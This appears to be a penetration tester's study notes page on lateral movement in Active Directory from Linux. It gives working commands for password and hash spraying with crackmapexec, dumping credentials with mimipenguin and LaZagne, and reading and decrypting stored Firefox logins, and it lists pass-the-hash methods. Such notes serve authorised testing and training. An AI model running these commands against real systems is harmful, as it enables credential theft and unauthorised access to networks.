---
title: Lateral Movement in Active Directory from Linux
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - active
  - directory
  - ldap
  - linux
---
# Lateral Movement in Active Directory from Linux

[Index of Active Directory](active-directory.md)

[Hardening and auditing Active Directory ](hardening-auditing-active-directory.md)

!!! tip "Attacking from linux"
	- [Enumerating Active Directory from Linux](active-directory-from-linux-enumeration.md)
	- [Attacking Active Directory from Linux](active-directory-from-linux-attacks.md)
	- [Lateral Movement in Active Directory from Linux](active-directory-from-linux-lateral-movement.md)
	- [Privileges escalation in Active Directory from Linux](active-directory-from-linux-privilege-escalation.md)

!!! tip "Attacking from Windows"
	- [Enumerating Active Directory from Windows](active-directory-from-windows-enumeration.md)
	- [Active directory: connecting to other hosts](active-directory-connections.md)
	- [Attacking Active Directory from Windows](active-directory-from-windows-attacks.md)
	- [Lateral Movement in Active Directory from Windows](active-directory-from-windows-lateral-movement.md)
	- [Privileges escalation in Active Directory from Windows](active-directory-from-windows-privilege-escalation.md)



##  Spraying password technique in the domain with crackmapexec

```
# Spraying password with crackmapexec
crackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +
# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list
# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.
# -H: hash
```

**This technique, while effective, is quite noisy and is not a good choice for any assessments that require stealth.** 

## Attacking SAM 

If we have a foothold in the target machine, we can retrieve other credentials existing in the host memory:

[See Attacking sam](attacking-sam.md)


## Memory and cache: mimipenguin, lazagne and Firefox_decrypt

Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused. 

[mimipenguin](https://github.com/huntergregal/mimipenguin)

```shell-session
sudo python3 mimipenguin.py
```


[lazagne](https://github.com/AlessandroZ/LaZagne)

```shell-session
sudo python2.7 laZagne.py all

# And browsers:
sudo python3 laZagne.py browsers

```

Firefox stored credentials:

```bash
ls -l .mozilla/firefox/ | grep default 

cat .mozilla/firefox/xxxxxxxxx-xxxxxxxxxx/logins.json | jq .
```

The tool [Firefox Decrypt](https://github.com/unode/firefox_decrypt) is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, `Firefox Decrypt 0.7.0` with Python 2 must be used.

```
git clone https://github.com/unode/firefox_decrypt.git   
cd firefox_decrypt 
python firefox_decrypt.py
```


## Pass the Hash (PtH)

A [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication.

- Pass the Hash with Mimikatz (Windows)
- Pass the Hash with PowerShell Invoke-TheHash (Windows)
- Pass the Hash with Impacket (Linux)
- Pass the Hash with CrackMapExec (Linux)
- Pass the Hash with evil-winrm (Linux)
- Pass the Hash with RDP (Linux)
- UAC Limits Pass the Hash for Local Accounts

[See Pass the Hash](pass-the-hash.md).
